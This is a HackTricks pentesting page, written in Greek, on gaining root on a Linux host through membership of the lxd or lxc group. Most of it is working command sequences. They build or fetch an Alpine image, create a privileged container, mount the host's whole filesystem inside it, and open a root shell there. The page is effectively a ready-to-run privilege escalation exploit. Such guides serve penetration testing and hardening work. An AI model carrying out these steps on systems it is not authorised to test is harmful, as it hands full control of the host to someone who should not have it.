# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Αν ανήκεις στο _**lxd**_ **ή** στο _**lxc**_ **group**, μπορείς να γίνεις root

## Exploiting without internet

### Method 1

Μπορείς να κατεβάσεις ένα alpine image για χρήση με το lxd από ένα trusted repository.  
Η Canonical δημοσιεύει daily builds στον ιστότοπό της: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Απλώς κατέβασε τόσο το **lxd.tar.xz** όσο και το **rootfs.squashfs** από το νεότερο build. (Το όνομα του directory είναι η ημερομηνία).

Εναλλακτικά, μπορείς να εγκαταστήσεις στο μηχάνημά σου αυτό το distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (ακολούθησε τις οδηγίες του github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Ανεβάστε τα αρχεία **incus.tar.xz** (**lxd.tar.xz** αν τα κατεβάσατε από το Canonical repository) και **rootfs.squashfs**, προσθέστε το image στο repo και δημιουργήστε ένα container:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Αν εμφανιστεί αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
> Εκτελέστε **`lxd init`** και ρυθμίστε όλες τις επιλογές στις προεπιλεγμένες τιμές. Στη συνέχεια, **επαναλάβετε το προηγούμενο τμήμα εντολών**

Τέλος, μπορείτε να εκτελέσετε το container και να αποκτήσετε root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Μέθοδος 2

Δημιουργήστε ένα Alpine image και εκκινήστε το χρησιμοποιώντας το flag `security.privileged=true`, αναγκάζοντας το container να αλληλεπιδρά ως root με το filesystem του host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
